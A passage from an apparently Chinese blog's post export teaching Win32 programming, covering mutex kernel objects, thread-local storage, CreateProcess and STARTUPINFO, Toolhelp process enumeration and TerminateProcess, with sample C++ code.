NULL, 0, NULL); HANDLE h2 = (HANDLE)_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)myThread, NULL, 0, NULL); HANDLE h3 = (HANDLE)_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)myThread, NULL, 0, NULL); HANDLE h4 = (HANDLE)_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)myThread, NULL, 0, NULL); WaitForSingleObject(h1, INFINITE); WaitForSingleObject(h2, INFINITE); WaitForSingleObject(h3, INFINITE); WaitForSingleObject(h4, INFINITE); CloseHandle(h1); CloseHandle(h2); CloseHandle(h3); CloseHandle(h4); return 0;&#125; 互斥内核对象 互斥（Mutex）是一种用途非常广泛的内核对象。 能够保证多个线程对同一共享资源的互斥访问。 同临界区有些类似，只有拥有互斥对象的线程才具有访问资源的权限，由于互斥对象只有一个，因此就决定了任何情况下此共享资源都不会同时被多个线程所访问。 当前占据资源的线程在任务处理完后应将拥有的互斥对象交出，以便其他线程在获得后得以访问资源。 与其他几种内核对象不同，互斥对象在操作系统中拥有特殊代码，并由操作系统来管理，操作系统 甚至还允许其进行一些其他内核对象所不能进行的非常规操作。 黑点表示令牌，只有拿到令牌的线程才能进入访问资源，访问结束后要交出令牌，不然其他线程会一直无法访问该资源。 以互斥内核对象来保持线程同步可能用到的函数主要有CreateMutex、OpenMutex. ReleaseMutex、 WaitForSingleObject和WaitForMultipleObjects等。 在使用互斥对象前，首先要通过CreateMutex或OpenMutex创建或打开一个互斥对象。 CreateMutex函数原型如下： 12345HANDLE CreateMutex(LPSECURITY_ATTRIBUTES IpMutexAttributes， //安全属性指针BOOL bInitialOwner， //初始拥有者LPCTSTR IpName //互斥对象名) 参数blnitialowner主要用来控制互斥对象的初始状态。一般多将其设置为FALSE，以表 明互斥对象在创建时并没有为任何线程所占有。 如果在创建互斥对象时指定了对象名，那么可以在本进程其他地方或是在其他进程通过OpenMutex函数得到此互斥对象的句柄。 OpenMutex函数原型为： 12345HANDLE OpenMutex(DWORD dwDesiredAccess，//访问标志BOOL bInheritHandle， //继承标志LPCTSTR IpName //互斥对象名) 当目前对资源具有访问权的线程不再需要访问此资源而要离开时，必须通过ReleaseMutex函数来释放其拥有的互斥对。 ReleaseMutex函数原型为： 1BOOL ReleaseMutex(HANDLE hMutex); 其惟一的参数hMutex为待释放的互斥对象句柄。 至于WaitForSingleObject和WaitForMultipleObjects等待函数在互斥对象保持线程同步中所起的作用与在其他内核对象中的作用是基本一致的，也是等待互斥内核对象的通知。 但是这里需要特别指出的是：在互斥对象通知引起调用等待函数返回时，等待函数的返回值不再是通常的WAIT_OBJECT_0 （对于WaitForSingleObject函数）或是在WAIT_OBJECT_0到WAIT_OBJECT_0+nCount-1之间的一个值（对于WaitForMultipleObiects函数） 而是将返回一个WAIT_ABANDONED_0 （对于WaitForSingleObject函数）或是在WAIT_ABANDONED_0到WAIT_ABANDONED_0+nCount-1之间的一个值（对于WaitForMultipleObjects函数） ，以此来表明线程正在等待的互斥对象由另外一个线程所拥有，而此线程却在使用完共享资源前就已经终止。 除此之外，使用互斥对象的方法在等待线程的可调度性上同使用其他几种内核对象的方法也有所不同，其他内核对象在没有得到通知时，受调用等待函数的作用，线程将会挂起，同时失去可调度性，而使用互斥的方法却可以在等待的同时仍具有可调度性，这也正是互斥对象所能完成的非常规操作之一 关于WAIT_ABANDONED或WAIT_ABANDONED_0返回值 假设有A、B两个线程和一个互斥量hMutex。如果A线程调用WaitForSingleObject获取到互斥量后，并没有调用ReleaseMutex来释放互斥量就终止了（如调用了ExitThread,TerminateThread）。然后线程B调用WaitForSingleObject就会返回WAIT_ABANDONED，并且线程B获取到互斥量，线程B使用完成后应该调用ReleasMutex释放互斥量 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include&lt;iostream&gt;#include&lt;windows.h&gt;#include&lt;process.h&gt;using namespace std;//信号量对象句柄HANDLE hMutex;HANDLE h1;HANDLE h2;HANDLE h3;HANDLE h4; UINT WINAPI myThread(LPVOID pParam) &#123; WaitForSingleObject(hMutex, INFINITE); cout &lt;&lt; \"调用了\" &lt;&lt; (char *)pParam &lt;&lt; \"线程\" &lt;&lt; endl; ReleaseMutex(hMutex); //试图进入信号量关口 DWORD dw = WaitForSingleObject(hMutex, INFINITE); switch (dw) &#123; case WAIT_FAILED: // 调用WaitForMultipleObjects函数失败(句柄无效？) cout &lt;&lt; (char *)pParam &lt;&lt; \"线程\" &lt;&lt; \"调用WaitForMultipleObjects函数失败\" &lt;&lt; endl; return 0; break; case WAIT_TIMEOUT: // 在10毫秒后没有一个内核对象受信 cout &lt;&lt; (char *)pParam &lt;&lt; \"线程\" &lt;&lt; \"等待10ms后Mutex内核对象未受信,所以结束本线程\" &lt;&lt; endl; return 0; break; case WAIT_OBJECT_0: // hMutex句柄对应的内核对象受信 cout &lt;&lt; (char *)pParam &lt;&lt; \"线程\" &lt;&lt; \" hMutex句柄对应的内核对象受信,本线程会正常工作\" &lt;&lt; endl; break; case WAIT_ABANDONED_0: cout &lt;&lt; \"上一个线程在使用完之后,没有使用ReleaseMutex释放\" &lt;&lt; endl; cout &lt;&lt; (char *)pParam &lt;&lt; \": \"; cout &lt;&lt; 123 &lt;&lt; endl; ReleaseMutex(hMutex); return 0; &#125; cout &lt;&lt; (char *)pParam &lt;&lt; \": \"; cout &lt;&lt; 123 &lt;&lt; endl; //释放信号量计数 //ReleaseMutex(hMutex); return 0;&#125;int main(char *argv[], int argc)&#123; //创建信号量对象 hMutex = CreateMutex(NULL,FALSE,NULL); h1 = (HANDLE) _beginthreadex(NULL, NULL, (_beginthreadex_proc_type)myThread, \"a\", 0, NULL); h2 = (HANDLE)_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)myThread, \"b\", 0, NULL); h3 = (HANDLE)_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)myThread, \"c\", 0, NULL); h4 = (HANDLE)_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)myThread, \"d\", 0, NULL); WaitForSingleObject(h1, INFINITE); WaitForSingleObject(h2, INFINITE); WaitForSingleObject(h3, INFINITE); WaitForSingleObject(h4, INFINITE); return 0;&#125; 在编写程序时，互斥对象多用在对那些为多个线程所访问的内存块的保护上，可以确保任 何线程在处理此内存块时都对其拥有可靠的独占访问权。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include&lt;iostream&gt;#include&lt;windows.h&gt;#include&lt;process.h&gt;using namespace std;//信号量对象句柄HANDLE hMutex;HANDLE h1;HANDLE h2;HANDLE h3;HANDLE h4; UINT WINAPI myThread(LPVOID pParam) &#123; cout &lt;&lt; \"调用了\" &lt;&lt; (char *)pParam &lt;&lt; \"线程\" &lt;&lt; endl; //试图进入信号量关口 DWORD dw = WaitForSingleObject(hMutex, 10); switch (dw) &#123; case WAIT_FAILED: // 调用WaitForMultipleObjects函数失败(句柄无效？) cout &lt;&lt; (char *)pParam &lt;&lt; \"线程\" &lt;&lt; \"调用WaitForMultipleObjects函数失败\" &lt;&lt; endl; return 0; break; case WAIT_TIMEOUT: // 在10毫秒后没有一个内核对象受信 cout &lt;&lt; (char *)pParam &lt;&lt; \"线程\" &lt;&lt; \"等待10ms后Mutex内核对象未受信,所以结束本线程\" &lt;&lt; endl; return 0; break; case WAIT_OBJECT_0: // hMutex句柄对应的内核对象受信 cout &lt;&lt; (char *)pParam &lt;&lt; \"线程\" &lt;&lt; \" hMutex句柄对应的内核对象受信,本线程会正常工作\" &lt;&lt; endl; break; &#125; Sleep(500); cout &lt;&lt; (char *)pParam &lt;&lt; \": \"; cout &lt;&lt; 123 &lt;&lt; endl; //释放信号量计数 ReleaseMutex(hMutex); return 0;&#125;int main(char *argv[], int argc)&#123; //创建信号量对象 hMutex = CreateMutex(NULL,FALSE,NULL); h1 = (HANDLE) _beginthreadex(NULL, NULL, (_beginthreadex_proc_type)myThread, \"a\", 0, NULL); h2 = (HANDLE)_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)myThread, \"b\", 0, NULL); h3 = (HANDLE)_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)myThread, \"c\", 0, NULL); h4 = (HANDLE)_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)myThread, \"d\", 0, NULL); WaitForSingleObject(h1, INFINITE); WaitForSingleObject(h2, INFINITE); WaitForSingleObject(h3, INFINITE); WaitForSingleObject(h4, INFINITE); return 0;&#125; 线程局部存储 线程局部存储（thread-local storage， TLS）是一个使用很方便的存储线程局部数据的系统。 利用TLS机制可以为进程中所有的线程关联若干个数据，各个线程通过由TLS分配的全局索引来访问与自己关联的数据。 这样，每个线程都可以有线程局部的静态存储数据。 用于管理TLS的数据结构是很简单的， Windows仅为系统中的每一个进程维护一个位数组，再为该进程中的每一个线程申请一个同样长度的数组空间。 运行在系统中的每一个进程都有一个位数组。 位数组的成员是一个标志，每个标志的值被设为FREE或INUSE，指示了此标志对应的数组索引是否在使用中。 Windodws保证至少有TLS_MINIMUM_AVAILABLE（定义在WinNTh文件中）个标志位可用。 （1）主线程调用TIsAlloc函数为线程局部存储分配索引，函数原型为： 1DWORD TIsAlloc(void); //返回一个TLS索引 系统为每一个进程都维护着一个长度为TLS_MINIMUM_AVAILABLE的位数组， TIsAlloc的返回值就是数组的一个下标（索引）。 这个位数组的惟一用途就是记忆哪一个下标在使用中。 初始状态下，此位数组成员的值都是FREE，表示未被使用。 当调用TIsAlloc的时候，系统会挨个检查这个数组中成员的值，直到找到一个值为FREE的成员。把找到的成 员的值由FREE改为INUSE后， TIsAlloc函数返回该成员的索引。 如果不能找到一个值为FREE的成员， TIsAlloc函数就返回TLS_OUT_OF_INDEXES （在WinBase.h文件中定义为-1），意味着失败。 当一个线程被创建时， Windows就会在进程地址空间中为该线程分配一个长度为TLS_MINIMUM_AVAILABLE的数组，数组成员的值都被初始化为0。 在内部，系统将此数组与该线程关联起来，保证只能在该线程中访问此数组中的数据。 每个线程都有它自己的数组，数组成员可以存储任何数据。 （2）每个线程调用TIsSetValue和TIsGetValue设置或读取线程数组中的值，TIsSetValue函数原型为： 12345BOOL TIsSetValue(DWORD dwTisindex, //TLS索引LPVOID IpTIsValue //要设置的值);LPVOID TIsGetValue(DWORD dwTIslIndex);//TLS索引 TlsSetValue函数将参数IpTIsValue指定的值放入索引为dwTIsIndex的线程数组成员中。 这样，IpTisValue的值就与调用TIisSetValue函数的线程关联了起来。 此函数调用成功，会返回TRUE 调用TIsSetValue函数，一个线程只能改变自己线程数组中成员的值，而没有办法为另 个线程设置TLS值。 到现在为止，将数据从一个线程传到另一个线程的惟一方法是在创建线 程时使用线程函数的参数。 TIsGetValue函数的作用是取得线程数组中索引为dwTIsIndex的成员的值。 TlsSetValue和TIsGetValue分别用于设置和取得线程数组中的特定成员的值，而它们使用 的索引就是TIsAlloc函数的返回值。 这就充分说明了进程中惟一的位数组和各线程数组的关系。 例如， TIsAlloc返回3，那就说明索引3被此进程中的每一个正在运行的和以后要被创建的线程保存起来，用以访问各自线程数组中对应的成员的值。 （3）主线程调用TIsFree释放局部存储索引。函数的惟一参数是TIsAlloc返回的索引。 利用TLS可以给特定的线程关联一个数据。比如下面的例子将每个线程的创建时间与该 线程关联了起来，这样，在线程终止的时候就可以得到线程的生命周期。整个跟踪线程运行时 间的例子的代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273///////////////////////////////////////////////////////////////// 02UseTLS.cpp.cpp文件#include &lt;stdio.h&gt;#include &lt;windows.h&gt;#include &lt;process.h&gt;// 利用TLS记录线程的运行时间DWORD g_tlsUsedTime;void InitStartTime();DWORD GetUsedTime();UINT __stdcall ThreadFunc(LPVOID)&#123; int i; // 初始化开始时间 InitStartTime(); // 模拟长时间工作 i = 10000*10000; while(i--) &#123; &#125; // 打印出本线程运行的时间 printf(\" This thread is coming to end. Thread ID: %-5d, Used Time: %d \\n\", ::GetCurrentThreadId(), GetUsedTime()); return 0;&#125;int main(int argc, char* argv[])&#123; UINT uId; int i; HANDLE h[10]; // 通过在进程位数组中申请一个索引，初始化线程运行时间记录系统 g_tlsUsedTime = ::TlsAlloc(); // 令十个线程同时运行，并等待它们各自的输出结果 for(i=0; i&lt;10; i++) &#123; h[i] = (HANDLE)::_beginthreadex(NULL, 0, ThreadFunc, NULL, 0, &amp;uId); &#125; for(i=0; i&lt;10; i++) &#123; ::WaitForSingleObject(h[i], INFINITE); ::CloseHandle(h[i]); &#125; // 通过释放线程局部存储索引，释放时间记录系统占用的资源 ::TlsFree(g_tlsUsedTime); return 0;&#125;// 初始化线程的开始时间void InitStartTime()&#123; // 获得当前时间，将线程的创建时间与线程对象相关联 DWORD dwStart = ::GetTickCount(); ::TlsSetValue(g_tlsUsedTime, (LPVOID)dwStart);&#125;// 取得一个线程已经运行的时间DWORD GetUsedTime()&#123; // 获得当前时间，返回当前时间和线程创建时间的差值 DWORD dwElapsed = ::GetTickCount(); dwElapsed = dwElapsed - (DWORD)::TlsGetValue(g_tlsUsedTime); return dwElapsed;&#125; GetTickCount函数可以取得Windows从启动开始经过的时间，其返回值是以毫秒为单位 的已启动的时间","categories":[{"name":"windows程序设计","slug":"windows程序设计","permalink":"https://xiaowuyoucy.github.io/categories/windows程序设计/"}],"tags":[]},{"title":"Win32程序运行原理","slug":"win0002-Win32程序运行原理","date":"2021-05-18T18:02:51.000Z","updated":"2021-05-19T16:27:45.112Z","comments":true,"path":"2021/05/19/win0002-Win32程序运行原理/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/19/win0002-Win32程序运行原理/","excerpt":"","text":"Win32程序运行原理 CPU的保护模式和Windows系统 80386处理器有三种工作模式：实模式、保护模式和虚拟86模式 实模式和虚拟模式是为了和8086处理器兼容而设置的 Windows操作系统运行在保护模式中 Windows的多任务实现 多任务隔离技术：可以使每个任务都有独立的地址空间，就像每个任务独享一个CPU一样 在Windows中任务被进程取代 进程就是正在运行的应用程序的实例（执行它的是线程，进程实则就是一块应用程序的空间） Windows是多任务操作系统 每个进程内的线程只能访问自己 线程的内存，不能访问其他进程的内存 例如 有进程A，B A进程中的线程只能访问自己进程的内存，不能访问B进程中的地址 虚拟内存 Windows为每个进程分配4GB的地址空间主要依靠CPU支持 CPU在保护模式下支持虚拟存储 虚拟内存：将磁盘空间当做内存空间来使用 页文件：包含了对所有进程都有效的虚拟内存 4GB虚拟地址的前半部分留给系统，后半部分留给用户 系统空间：内核代码、设备驱动代码等等。部分空间是共享的 内核模式和用户模式： 80386处理器共定义了4中（0~3）特权级别 称为环 0是特权级(最高级) 3是用户级 Windows有两种模式: 内核模式是0级：系统程序（驱动等等） 用户模式是3级 当应用程序调用系统函数时，会从用户模式切换到内核模式去执行 内核对象 内核对象：系统提供用户模式下代码与内核模式下代码进行交互的基本接口。 对象句柄： 调用函数创建一个内核对象时会返回一个此对象的句柄 很多API函数都需要使用此句柄来辨别处理哪个内核对象，该句柄仅对创建该内核对象的进程有效 也可以多个进程共享一个内核对象，调用DuplicateHandle复制一个进程句柄传给其他进程 使用计数 系统为进程分配内核对象资源时,会将内核对象使用计数属性初始化为1 以后每次打开这个内核对象,系统就会将使用计数加1,关闭则减1 使用计数为0时,说明这个内核对象所有引用都已经关闭,系统会释放该内核对象资源 进程的创建 进程和线程: 进程: 磁盘将可执行文件载入内存之后就变成了进程 进程是一个正在运行的程序 拥有自己的虚拟空间地址、代码、数据、其他系统资源 有一个或多个线程 一个进程要完成任何事情，必须拥有一个在它地址空间中运行的线程，此线程负责执行该进程地址空间的代码 线程: 进程内执行代码的独立实体 系统创建一个进程后，会创建一个线程来执行进程内的代码，这个线程称为主线程 主线程运行过程中可以创建其他线程，一般主线程创建的线程称为辅助线程或子线程 组成Win32进程的两个部分 1.进程内核对象：操作系统使用此内核对象进行管理该进程 2.私有的虚拟地址空间：包含了所有可执行的或是DLL模块的代码和数据、程序动态申请内存的地方 应用程序的启动过程 控制台应用程序的启动过程 1.操作系统会调用C/C运行期启动函数（会初始化C/C运行期库） 2.C/C++运行期启动函数调用入口main函数 Win32应用程序的启动过程 1.操作系统会调用CreateProcess函数来创建一个新的进程 当一个线程调用CreateProcess函数的时候,系统会创建一个进程内核对象,初始化使用计数为1 该进程内核对象是一个系统用来管理这个进程的数据结构 2.为新的进程创建一个虚拟空间,加载应用程序运行时所需要的代码和数据 3.为新的进程创建一个主线程 4.主线程会执行C/C++运行期启动代码 5.C/C++运行期启动代码会调用main函数 如果系统成功创建一个进程和一个主线程,CreateProcess会返回TRUE,否者返回FALSE 创建进程称为父进程,被创建进程称为子进程 系统在创建新进程的时候会传递一个STARTUPINFO类型的变量,这个结构体包含了父进程传递给子进程的一些信息 STARTUPINFO结构体定义如下 123456789101112131415161718192021typedef struct _STARTUPINFO &#123; DWORD cb; //包含STARTUPINFO结构中的字节数.如果Microsoft将来扩展该结构,它可用作版本控制手段.应用程序必须将cb初始化为sizeof(STARTUPINFO) PSTR lpReserved; //保留。必须初始化为NULL PSTR lpDesktop; //用于标识启动应用程序所在的桌面的名字。如果该桌面存在，新进程便与指定的桌面相关联。如果桌面不存在，便创建一个带有默认属性的桌面，并使用为新进程指定的名字。如果lpDesktop是NULL（这是最常见的情况 ),那么该进程将与当前桌面相关联 PSTR lpTitle; //用于设定控制台窗口的名称。如果lpTitle是NULL，则可执行文件的名字将用作窗口名.This parameter must be NULL for GUI or console processes that do not create a new console window. DWORD dwX; //用于设定应用程序窗口相对屏幕左上角位置的x 坐标（以像素为单位）。 DWORD dwY; //对于GUI processes用CW_USEDEFAULT作为CreateWindow的x、y参数，创建它的第一个重叠窗口。若是创建控制台窗口的应用程序，这些成员用于指明相对控制台窗口的左上角的位置 DWORD dwXSize; //用于设定应用程序窗口的宽度（以像素为单位） DWORD dwYSize; //子进程将CW_USEDEFAULT 用作CreateWindow 的nWidth、nHeight参数来创建它的第一个重叠窗口。若是创建控制台窗口的应用程序，这些成员将用于指明控制台窗口的宽度 DWORD dwXCountChars; //用于设定子应用程序的控制台窗口的宽度（屏幕显示的字节列）和高度（字节行）（以字符为单位） DWORD dwYCountChars; DWORD dwFillAttribute; //用于设定子应用程序的控制台窗口使用的文本和背景颜色 DWORD dwFlags; //请参见下一段和表4-7 的说明 WORD wShowWindow; //用于设定如果子应用程序初次调用的ShowWindow 将SW_*作为nCmdShow 参数传递时，该应用程序的第一个重叠窗口应该如何出现。本成员可以是通常用于ShowWindow 函数的任何一个SW_*标识符，除了SW_SHOWDEFAULT. WORD cbReserved2; //保留。必须被初始化为0 PBYTE lpReserved2; //保留。必须被初始化为NULL HANDLE hStdInput; //用于设定供控制台输入和输出用的缓存的句柄。按照默认设置，hStdInput 用于标识键盘缓存，hStdOutput 和hStdError用于标识控制台窗口的缓存 HANDLE hStdOutput; HANDLE hStdError; &#125; STARTUPINFO, *LPSTARTUPINFO; dwFlags 使用标志及含义 1234567STARTF_USESIZE // 使用dwXSize和dwYSize成员STARTF_USESHOWWINDOW //使用wShowWindow成员STARTF_USEPOSITION //使用dwX和dwY成员STARTF_USECOUNTCHARS //使用dwXCountChars和dwYCountChars成员STARTF_USEFILLATTRIBUTE //使用dwFillAttribute成员STARTF_USESTDHANDLES //使用hStdInput、hStdOutput和hStdError成员STARTF_RUN_FULLSCREEN //强制在x 8 6 计算机上运行的控制台应用程序以全屏幕方式启动运行 GetStartupInfo函数 获取父进程创建自己时使用的STARTUPINFO结构 12345VOID GetStartupInfo(LPSTARTUPINFO lpStartupInfo // STARTUPINFO指针); 定义一个STARTUPINFO结构体变量后要初始化cb成员 12STARTUPINFO si = &#123;sizeof(STARTUPINFO)&#125;;GetStartupInfo(&amp;si); CreateProcess函数 用来创建一个新的进程和它的主线程，这个新进程运行指定的可执行文件 123456789101112 BOOL CreateProcess( LPCTSTR lpApplicationName, // 应用程序名称 LPTSTR lpCommandLine, // 命令行字符串 LPSECURITY_ATTRIBUTES lpProcessAttributes, // 进程的安全属性 NULL默认安全属性 LPSECURITY_ATTRIBUTES lpThreadAttributes, // 线程的安全属性 NULL默认安全属性 BOOL bInheritHandles, // 是否继承父进程的属性 DWORD dwCreationFlags, // 创建标志 LPVOID lpEnvironment, // 指向新的环境块的指针 LPCTSTR lpCurrentDirectory, // 指向当前目录名的指针 LPSTARTUPINFO lpStartupInfo, // 传递给新进程的信息 LPPROCESS_INFORMATION lpProcessInformation // 新进程返回的信息 ); lp开头代表是说明变量类型为指针变量 LPCSTR 是 const char * WINDEF.h头文件包含了变量类型对应的宏名 12345678910111213141516171819202122typedef unsigned long DWORD; typedef int BOOL; typedef unsigned char BYTE; typedef unsigned short WORD; typedef float FLOAT; typedef FLOAT *PFLOAT; typedef BOOL near *PBOOL; typedef BOOL far *LPBOOL; typedef BYTE near *PBYTE; typedef BYTE far *LPBYTE; typedef int near *PINT; typedef int far *LPINT; typedef WORD near *PWORD; typedef WORD far *LPWORD; typedef long far *LPLONG; typedef DWORD near *PDWORD; typedef DWORD far *LPDWORD; typedef void far *LPVOID; typedef CONST void far *LPCVOID; typedef int INT; typedef unsigned int UINT; typedef unsigned int *PUINT; 创建一个新的进程打开记事本 PROCESS_INFORMATION结构体 创建了一个进程之后,如果不使用hProcess或hThread时就应该释放它 父进程必须要有一个CloseHandle函数来关闭CreateProcess函数返回的两个内核对象句柄，否者基本子进程已经终止了,该进程的内核对象和主线程的内核对象仍然没有释放 12345678910111213141516171819202122232425262728293031323334353637///////////////////////////////////////////////////////////////// 02CreateProcess.cpp文件#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main(int argc, char* argv[])&#123; char szCommandLine[] = \"cmd\"; STARTUPINFO si = &#123; sizeof(si) &#125;; PROCESS_INFORMATION pi; si.dwFlags = STARTF_USESHOWWINDOW; // 指定wShowWindow成员有效 si.wShowWindow = TRUE; // 此成员设为TRUE的话则显示新建进程的主窗口， // 为FALSE的话则不显示 BOOL bRet = ::CreateProcess ( NULL, // 不在此指定可执行文件的文件名 szCommandLine, // 命令行参数 NULL, // 默认进程安全性 NULL, // 默认线程安全性 FALSE, // 指定当前进程内的句柄不可以被子进程继承 CREATE_NEW_CONSOLE, // 为新进程创建一个新的控制台窗口 NULL, // 使用本进程的环境变量 NULL, // 使用本进程的驱动器和目录 &amp;si, &amp;pi); if(bRet) &#123; // 既然我们不使用两个句柄，最好是立刻将它们关闭 ::CloseHandle (pi.hThread); ::CloseHandle (pi.hProcess); printf(\" 新进程的进程ID号：%d \\n\", pi.dwProcessId); printf(\" 新进程的主线程ID号：%d \\n\", pi.dwThreadId); &#125; return 0;&#125; windows是通过dwFlags来查看STARTUPINFO变量中的哪一个成员有效，再去取那个成员的值 使用wShowWindow成员用STARTF_USESHOWWINDOW 使用dwXSize和dwXSize用STARTF_USESIZE 使用dwX，dwY成员用STARTF_USEPOSITION dwFlags = STARTF_USESHOWWINDOW | STARTF_USESIZE | STARTF_USEPOSITION 则wShowWindow,dwXSize,dwXSize,dwX，dwY成员都有效 CREATE_NEW_CONSOLE 表示创建一个新的控制台 CloseHandle函数 关闭一个内核对象 12345BOOL CloseHandle(HANDLE hObject //代表一个已打开对象handle。); TRUE：执行成功； FALSE：执行失败，可以调用GetLastError()获知失败原因。 进程控制 获取系统进程 PROCESSENTRY32 结构 123456789101112typedef struct &#123; DWORD dwSize; // 结构大小； DWORD cntUsage; // 此进程的引用计数； DWORD th32ProcessID; // 进程ID; DWORD th32DefaultHeapID; // 进程默认堆ID； DWORD th32ModuleID; // 进程模块ID； DWORD cntThreads; // 此进程开启的线程计数； DWORD th32ParentProcessID;// 父进程ID； LONG pcPriClassBase; // 线程优先权； DWORD dwFlags; // 保留； char szExeFile[MAX_PATH]; // 进程全名； &#125; PROCESSENTRY32; CreateToolhelp32Snapshot 可以通过获取进程信息为指定的进程、进程使用的堆[HEAP]、模块[MODULE]、线程建立一个快照。 头文件：tlhelp32.h 返回值： 调用成功，返回快照的句柄，调用失败，返回INVALID_HANDLE_VALUE** 1234567**HANDLE WINAPI CreateToolhelp32Snapshot(***DWORD dwFlags,* //用来指定“快照”中需要返回的对象，可以是TH32CS_SNAPPROCESS等*DWORD th32ProcessID* //一个进程ID号，用来指定要获取哪一个进程的快照，当获取系统进程列表 //获取 当前进程快照时可以设为0); 指定快照中包含的系统内容，dwFlags这个参数能够使用下列数值（常量）中的一个或多个。 TH32CS_INHERIT 声明快照句柄是可继承的。 TH32CS_SNAPALL 在快照中包含系统中所有的进程和线程。 TH32CS_SNAPHEAPLIST 在快照中包含在th32ProcessID中指定的进程的所有的堆。 TH32CS_SNAPMODULE 在快照中包含在th32ProcessID中指定的进程的所有的模块。 TH32CS_SNAPPROCESS 在快照中包含系统中所有的进程。 TH32CS_SNAPTHREAD 在快照中包含系统中所有的线程。 H32CS_SNAPALL = (TH32CS_SNAPHEAPLIST | TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD | TH32CS_SNAPMODULE) process32First 是一个进程获取函数，当我们利用函数CreateToolhelp32Snapshot()获得当前运行进程的快照后，我们可以利用process32First函数来获得第一个进程的句柄。 1234BOOL WINAPI Process32First( HANDLE hSnapshot, //快照句柄 LPPROCESSENTRY32 lppe //PROCESSENTRY32指针); Process32Next 是一个进程获取函数，当我们利用函数CreateToolhelp32Snapshot()获得当前运行进程的快照后,我们可以利用Process32Next函数来获得下一个进程的句柄。 1234BOOL WINAPI Process32Next( HANDLE hSnapshot, //快照句柄 LPPROCESSENTRY32 lppe //PROCESSENTRY32指针); 获取系统进程的例子 123456789101112131415161718192021222324252627282930313233343536///////////////////////////////////////////////////////////////// 02ProcessList.cpp文件#include \"stdafx.h\"#include &lt;windows.h&gt;#include &lt;tlhelp32.h&gt; // 声明快照函数的头文件int main(int argc, char* argv[])&#123; PROCESSENTRY32 pe32; // 在使用这个结构之前，先设置它的大小 pe32.dwSize = sizeof(pe32); // 给系统内的所有进程拍一个快照 HANDLE hProcessSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if(hProcessSnap == INVALID_HANDLE_VALUE) &#123; printf(\" CreateToolhelp32Snapshot调用失败！ \\n\"); return -1; &#125; // 遍历进程快照，轮流显示每个进程的信息 BOOL bMore = ::Process32First(hProcessSnap, &amp;pe32); while(bMore) &#123; printf(\" 进程名称：%s \\n\", pe32.szExeFile); printf(\" 进程ID号：%u \\n\\n\", pe32.th32ProcessID); bMore = ::Process32Next(hProcessSnap, &amp;pe32); &#125; // 不要忘记清除掉snapshot对象 ::CloseHandle(hProcessSnap); return 0;&#125; 终止当前进程 终止进程也就是结束程序的执行，让它从内存中卸载。进程终止的原因可能有4种: (1)主线程的入口函数返回。 (2)进程中一个线程调用了ExitProcess 函数。 (3)此进程中的所有线程都结束了。 (4)其他进程中的一一个线程调 用了TerminateProcess 函数。 Exitprocess结束当前进程函数 1void Exitprocess(UINT uExitCode);//uExitCode为退出代码 TerminateProcess终止其他进程函数 1234BOOL TerminateProcess( HANDLE hprocess, //要结束的进程句柄 UINT uExitCode //指定目标进程的退出代码); OpenProcess 函数用来打开一个已存在的进程对象，并返回进程的句柄。 12345HANDLE OpenProcess(DWORD dwDesiredAccess, //渴望得到的访问权限（标志）BOOL bInheritHandle, // 是否继承句柄DWORD dwProcessId// 进程id); **dwDesiredAccess ：**获取的权限，可分为以下几种 PROCESS_ALL_ACCESS：获取所有权限 PROCESS_CREATE_PROCESS：创建进程 PROCESS_CREATE_THREAD：创建线程 PROCESS_DUP_HANDLE：使用DuplicateHandle()函数复制一个新句柄 PROCESS_QUERY_INFORMATION：获取进程的令牌、退出码和优先级等信息 PROCESS_QUERY_LIMITED_INFORMATION：获取进程特定的某个信息 PROCESS_SET_INFORMATION：设置进程的某种信息 PROCESS_SET_QUOTA：使用SetProcessWorkingSetSize函数设置内存限制 PROCESS_SUSPEND_RESUME：暂停或者恢复一个进程 PROCESS_TERMINATE：使用Terminate函数终止进程 PROCESS_VM_OPERATION：在进程的地址空间执行操作 PROCESS_VM_READ：使用ReadProcessMemory函数在进程中读取内存 PROCESS_VM_WRITE：使用WriteProcessMemory函数在进程中写入内存 SYNCHRONIZE：使用wait函数等待进程终止 12345678910111213141516171819202122232425262728293031323334353637///////////////////////////////////////////////////////////////// 02TerminateProcess.cpp文件#include \"stdafx.h\"#include &lt;windows.h&gt;BOOL TerminateProcessFromId(DWORD dwId)&#123; BOOL bRet = FALSE; // 打开目标进程，取得进程句柄 HANDLE hProcess = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwId); if(hProcess != NULL) &#123; // 终止进程 bRet = ::TerminateProcess(hProcess, 0); &#125; CloseHandle(hProcess); return bRet;&#125;int main(int argc, char* argv[])&#123; DWORD dwId; printf(\" 请输入您要终止的进程的ID号： \\n\"); scanf(\"%u\", &amp;dwId); if(TerminateProcessFromId(dwId)) &#123; printf(\" 终止进程成功！ \\n\"); &#125; else &#123; printf(\" 终止进程失败！ \\n\"); &#125; return 0;&#125; GetLastError获取调用线程的最后出错代码 1DWORD GetLastError(VOID); GetExitCodeProcess 获取一个已中断进程的退出代码 1234BOOL GetExitCodeProcess(HANDLE hProcess, //想获取退出代码的一个进程的句柄LPDWORD lpExitCode //用于装载进程退出代码的一个长整数变量。如进程尚未中止，则设为常数STILL_ACTIVE); 一旦进程终止， 就会有下列事件发生: (1)所有被这个进程创建或打开的对象句柄就会关闭。 (2)此进程内的所有线程将终止执行。 (3)进程内核对象变成受信状态，所有等待在此对象上的线程开始运行，即WaitForSingleObject函数返回。 (4)系统将进程对象中退出代码的值由STILL_ ACTIVE改为指定的退出码。 ReadProcessMemory是一个内存操作函数， 其作用为根据进程句柄读入该进程的某个内存空间 1234567BOOL ReadProcessMemory(HANDLE hProcess, //待读进程的句柄PVOID pvAddressRemote, 